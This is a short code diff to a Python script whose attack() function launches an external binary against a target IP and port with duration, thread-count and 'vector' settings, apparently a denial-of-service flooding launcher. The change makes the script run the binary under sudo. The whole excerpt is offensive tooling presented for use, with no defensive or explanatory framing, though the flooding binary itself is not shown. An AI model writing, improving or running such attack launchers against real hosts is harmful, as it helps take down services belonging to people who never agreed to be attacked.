@@ -20,14 +20,14 @@ def attack():
         print(f"Error: {BINARY} not found!")
         sys.exit(1)
     
-    # Build command
-    cmd = [BINARY, TARGET_IP, TARGET_PORT, DURATION, THREADS, VECTOR]
+    # Build command with sudo
+    cmd = ['sudo', BINARY, TARGET_IP, TARGET_PORT, DURATION, THREADS, VECTOR]
     
     print(f"🔥 Starting attack on {TARGET_IP}:{TARGET_PORT}")
     print(f"   Duration: {DURATION}s | Threads: {THREADS} | Vector: {VECTOR}")
     print(f"   Command: {' '.join(cmd)}")
     
-    # Execute attack (foreground - output visible)
+    # Execute attack with sudo
     subprocess.run(cmd)
 
 if __name__ == "__main__":
